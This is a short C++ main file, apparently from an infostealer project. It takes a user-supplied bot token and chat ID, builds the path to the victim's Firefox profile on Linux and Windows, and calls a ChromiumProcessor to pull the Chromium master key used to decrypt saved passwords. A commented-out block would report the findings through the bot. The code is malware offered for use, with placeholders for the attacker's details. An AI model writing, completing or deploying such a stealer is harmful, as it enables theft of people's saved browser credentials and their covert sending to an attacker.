#include "project-612.hpp"

int main()
{
    try
    {
        const string TOKEN("");    //put your bot token here
        int64_t ChatID=12345;         //put your chat id here

        Sender bot_sender(TOKEN);

#if defined(__linux__)
        string firefox_pass_path="~/.mozilla/firefox/<profilename>";
#elif defined(__WIN64__)
        TCHAR username[255];
        DWORD username_len=255;
        GetUserName((TCHAR*)username, &username_len);
        string firefox_pass_path=_T("C:\\Users\\");
        firefox_pass_path += username;
        firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
#endif
        ChromiumProcessor cProc1;

        cProc1.getMasterKey();
/*
        if(experimental::filesystem::exists(firefox_pass_path))
        {
            cout<<firefox_pass_path<<endl;
            cout<<"exists"<<endl;
            //bot_sender.send(ChatID, "ff exists");
        }
*/
    }
    catch(exception &e)
    {
        cout<<"error"<<endl;
        cerr<<e.what()<<endl;
    }

    return 0;
}
